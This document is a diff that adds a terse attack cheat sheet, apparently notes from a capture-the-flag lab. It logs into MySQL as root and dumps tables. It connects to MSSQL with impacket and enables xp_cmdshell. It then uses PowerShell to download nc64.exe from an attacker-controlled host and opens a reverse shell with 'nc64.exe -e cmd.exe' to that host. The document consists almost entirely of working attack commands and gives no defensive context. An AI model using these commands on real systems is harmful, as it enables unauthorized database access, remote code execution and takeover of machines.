@@ -1,0 +1,31 @@
+mysql -u root -h 10.129.209.100
+
+> show databases;
+
+> use dbs_name;
+
+> show tables;
+
+> select * from table_name;
+
+==========================
+impacket/examples
+==========================
+
+> python3 mssqlclient.py  domain/user:Password@10.129.98.169 -windows-auth
+
+> 
+-EXEC sp_configure 'show advanced options', 1;
+-RECONFIGURE;
+-EXEC sp_configure 'xp_cmdshell', 1;
+-RECONFIGURE;
+
+> SELECT is_srvrolemember('sysadmin');
+
+> EXEC xp_cmdshell "whoami"
+
+> xp_cmdshell "powershell -c pwd"
+
+> xp_cmdshell "powershell -c  cd c:\Users\sql_svc\Downloads; wget http://10.10.16.43:8080/nc64.exe -outfile nc64.exe"
+
+> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.43 5555"
